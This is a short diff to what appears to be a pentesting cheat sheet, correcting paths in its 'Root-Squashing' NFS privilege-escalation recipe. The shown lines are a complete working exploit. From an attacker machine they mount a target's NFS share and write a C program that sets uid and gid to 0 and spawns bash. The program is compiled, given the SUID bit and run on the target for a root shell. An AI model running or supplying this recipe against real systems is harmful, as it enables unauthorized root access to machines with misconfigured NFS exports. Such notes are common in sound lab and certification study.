@@ -358,11 +358,11 @@ chmod +xs /tmp/nfs/shell.elf # our kali
 ### Root-Squashing (2) ✡️
 ```bash
 showmount -e 10.10.10.10 # our kali
-mkdir /tmp/1 # our kali
+mkdir /tmp/nfs # our kali
 mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs # our kali
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs/shell.c # our kali
-gcc /tmp/1/shell.c -o /tmp/1/shell # our kali 
-chmod +s /tmp/1/shell # our kali OR target machine
+gcc /tmp/nfs/shell.c -o /tmp/nfs/shell # our kali 
+chmod +s /tmp/nfs/shell # our kali OR target machine
 /tmp/shell # target machine
 ```
 
